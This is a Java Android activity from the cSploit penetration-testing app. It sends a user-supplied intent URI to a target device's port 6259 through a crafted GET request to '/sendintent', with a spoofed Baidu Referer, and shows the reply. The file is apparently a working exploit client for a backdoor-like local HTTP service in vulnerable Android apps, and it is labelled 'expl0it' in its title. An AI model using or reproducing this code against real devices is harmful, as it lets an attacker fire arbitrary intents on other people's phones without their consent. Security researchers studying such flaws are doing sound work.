package org.csploit.android.bdcmdlist;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import org.csploit.android.R;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by heeeeen on 15/5/21.
 */
public class SendIntent extends ActionBarActivity {

    private TextView mResultView = null;
    private EditText mIntentUri = null;
    private Button m_btSend = null;

    private String mRequestUrl = null;
    private String mBaseUrl = null;
    private String mResult = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
        Boolean isDark = themePrefs.getBoolean("isDark", false);

        if (isDark)
            setTheme(R.style.DarkTheme);
        else
            setTheme(R.style.AppTheme);

        setContentView(R.layout.sendintent_layout);
        String target = getIntent().getStringExtra("targetIP");
        setTitle("expl0it > "+ target + " > sendintent");
        mBaseUrl = "http://" + target + ":6259/sendintent?" + "callback=x&mcmdf=inapp_x&intent=";

        mIntentUri = (EditText)findViewById(R.id.intenttosend);
        m_btSend = (Button)findViewById(R.id.sendintent);


        mResultView = (TextView) findViewById(R.id.sendintent_result);

        final Handler handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                if(msg.what == 0x01){

                    mResultView.setText(mResult);
                }
            }

        };

        m_btSend.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String strIntentUri = mIntentUri.getText().toString();

                if(strIntentUri != null){
                    mRequestUrl = mBaseUrl+ GenRequestUrl(strIntentUri);
                }else
                    mRequestUrl = mBaseUrl;

                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Log.d("heen","request url is "+mRequestUrl);
                            mResult = sendintent(mRequestUrl);
                            Log.d("heen", "addcontact_result =" + mResult);
                            handler.sendEmptyMessage(0x01);  //finished
                        } catch (Exception e) {

                        }

                    }
                }.start();
            }
        });


    }
    //  encode uri @h33n
    private String GenRequestUrl(String uri){
        String query = null;
        try {

            query = URLEncoder.encode(uri, "utf-8");

        }catch (Exception e){

        }
        return query;
    }

    // Given a URL, establishes an HttpUrlConnection and retrieves
    // the web page content as a InputStream, which it returns as
    // a string.
    private String sendintent(String myurl) throws IOException {
        InputStream is = null;
        // Only display the first 500 characters of the retrieved
        // web page content.
        int len = 500;

        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(1000 /* milliseconds */);
            conn.setConnectTimeout(1500 /* milliseconds */);
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Referer", "http://www.baidu.com");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();
            int response = conn.getResponseCode();
            Log.d("heen", "The response is: " + response);
            is = conn.getInputStream();

            // Convert the InputStream into a string
            String contentAsString = readIt(is, len);
            return contentAsString;

            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {
            if (is != null) {
                is.close();
            }
        }
    }

    // Reads an InputStream and converts it to a String.
    public String readIt(InputStream stream, int len) throws IOException, UnsupportedEncodingException {
        Reader reader = null;
        reader = new InputStreamReader(stream, "UTF-8");
        char[] buffer = new char[len];
        reader.read(buffer);
        return new String(buffer);
    }


}
